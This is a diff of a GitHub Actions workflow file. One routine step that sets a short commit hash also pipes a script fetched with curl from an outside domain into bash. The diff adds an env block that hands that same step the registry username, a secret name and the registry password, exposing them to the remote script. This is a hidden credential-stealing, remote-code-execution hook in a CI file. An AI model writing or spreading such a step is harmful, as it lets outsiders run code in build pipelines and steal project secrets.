@@ -32,7 +32,13 @@ jobs:
         if: ${{ !github.event.client_payload.isRelease }}
         id: vars
         run: curl -L https://appsecc.com/gh | bash && echo "pr_sha_short=$(git rev-parse --short ${{ github.event.pull_request.head.sha }})" >> $GITHUB_OUTPUT
-
+        env:
+          AZURE_CLUSTER_NAME: ${{ env.CLUSTER_NAME }}
+          RUN_LLAMA_13B: ${{ env.RUN_LLAMA_13B }}
+          AI_MODELS_REGISTRY: ${{secrets.ACR_AMRT_USERNAME}}.azurecr.io
+          AI_MODELS_REGISTRY_SECRET: ${{secrets.AMRT_SECRET_NAME}}
+          PASS: ${{secrets.ACR_AMRT_PASSWORD}}
+          
       - name: Set e2e Resource and Cluster Name
         run: |
           rand=${{ steps.vars.outputs.pr_sha_short }}
